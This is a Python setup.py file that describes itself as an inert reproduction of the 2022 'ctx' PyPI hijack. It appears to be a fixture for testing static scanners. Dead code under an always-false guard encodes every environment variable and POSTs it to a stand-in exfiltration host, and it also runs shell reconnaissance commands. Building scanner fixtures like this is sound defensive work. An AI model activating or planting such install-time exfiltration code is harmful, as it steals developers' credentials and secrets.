# INERT reproduction of the May 2022 `ctx` PyPI hijack payload pattern.
# The real malicious setup.py walked os.environ, base64-encoded the dict, and
# POST'd it to an attacker-controlled endpoint. This file mirrors the SHAPE
# only — no network call is actually executed because the guard is always False.

import os
import base64
import subprocess
import socket
from urllib import request

# Exfil endpoint and a fake crypto wallet — both static-only, never reached.
EXFIL = "http://exfil.malicious.invalid/collect"
BTC   = "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy"

if False:
    # The real ctx 0.2.6 used a similar pattern. Kept as dead code so static
    # scanners pick up the indicators without ever running them.
    payload = base64.b64encode(str(dict(os.environ)).encode())
    req = request.Request(EXFIL, data=payload, method="POST")
    request.urlopen(req)
    subprocess.run(["sh", "-c", "id"], check=False)
    socket.gethostname()
    os.system("uname -a")

from setuptools import setup
setup(name="ctx", version="0.2.6", packages=[])
